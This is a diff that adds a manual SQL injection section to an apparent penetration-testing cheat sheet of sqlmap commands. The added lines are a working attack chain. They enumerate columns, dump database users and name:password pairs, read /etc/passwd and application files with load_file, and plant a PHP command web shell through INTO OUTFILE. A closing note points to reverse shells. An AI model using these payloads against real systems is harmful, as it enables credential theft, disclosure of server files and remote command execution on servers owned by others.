@@ -32,3 +32,46 @@ sqlmap –u http://<targetip>/index.php?par= –dbs –D dbname –T tablename �
 sqlmap -u http://<targetip>/comment.php?id=738 --dbms=mysql --osshell
 
 --------------------------------
+
+Manual sql injection commands
+
+# check for sqli vulnerability
+?id=1'
+
+# find the number of columns
+?id=1 order by 9 -- -
+
+# Find space to output db
+?id=1 union select 1,2,3,4,5,6,7,8,9 -- -
+
+# Get username of the sql-user
+?id=1 union select 1,2,3,4,user(),6,7,8,9 -- -
+
+# Get version
+?id=1 union select 1,2,3,4,version(),6,7,8,9 -- -
+
+# Get all tables
+?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables -- -
+
+# Get all columns from a specific table
+?id=1 union select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name = 'users' -- -
+
+# Get content from the users-table. From columns name and password. (The 0x3a only servers to create a delimiter between name and password)
+?id=1 union select 1,2,3,4,concat(name,0x3a,password),6,7,8,9 FROM users
+
+# read file
+?id=1 union select 1,2,3,4, load_file('/etc/passwd') ,6,7,8,9 -- -
+?id=1 union select 1,2,3,4, load_file('/var/www/login.php') ,6,7,8,9 -- -
+
+# create a file and call it to check if really created
+?id=1 union select 1,2,3,4,'this is a test message' ,6,7,8,9 into outfile '/var/www/test' -- -
+?id=1 union select 1,2,3,4, load_file('/var/www/test') ,6,7,8,9 -- -
+	
+# create a file to get a shell
+?id=1 union select null,null,null,null,'<?php system($_GET[‘cmd’]) ?>' ,6,7,8,9 into outfile '/var/www/shell.php' -- -
+?id=1 union select null,null,null,null, load_file('/var/www/shell.php') ,6,7,8,9 -- -
+
+# then go to browser and see if you can execute commands
+http://<targetip>/shell.php?cmd=id
+
+# Then use Pentest Monkey Reverse Shells to call your shell
